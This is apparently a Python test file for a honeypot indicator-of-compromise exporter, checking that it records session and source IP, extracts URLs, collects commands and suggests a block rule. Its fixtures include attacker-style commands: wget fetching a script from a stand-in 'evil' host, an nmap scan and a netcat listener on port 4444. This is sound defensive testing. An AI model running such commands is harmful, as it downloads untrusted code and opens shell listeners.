from ioc_export import build_ioc

def _cmds(names):
    return [{"command": n, "threat_value": 10, "timestamp": None} for n in names]

def test_ioc_has_core_fields():
    ioc = build_ioc("s1", "9.9.9.9", _cmds(["wget http://evil/x.sh", "nmap 1.1.1.1"]))
    assert ioc["type"] == "honeymind.ioc"
    assert ioc["source_ip"] == "9.9.9.9"
    assert ioc["session_id"] == "s1"

def test_ioc_extracts_urls():
    ioc = build_ioc("s1", "9.9.9.9", _cmds(["wget http://evil.example/x.sh"]))
    assert "http://evil.example/x.sh" in ioc["indicators"]["urls"]

def test_ioc_lists_suggested_block_rule():
    ioc = build_ioc("s1", "9.9.9.9", _cmds(["nmap 1.1.1.1"]))
    assert "9.9.9.9" in ioc["suggested_block_rule"]

def test_ioc_collects_commands():
    ioc = build_ioc("s1", "9.9.9.9", _cmds(["nmap 1.1.1.1", "nc -lvnp 4444"]))
    assert ioc["indicators"]["commands"] == ["nmap 1.1.1.1", "nc -lvnp 4444"]
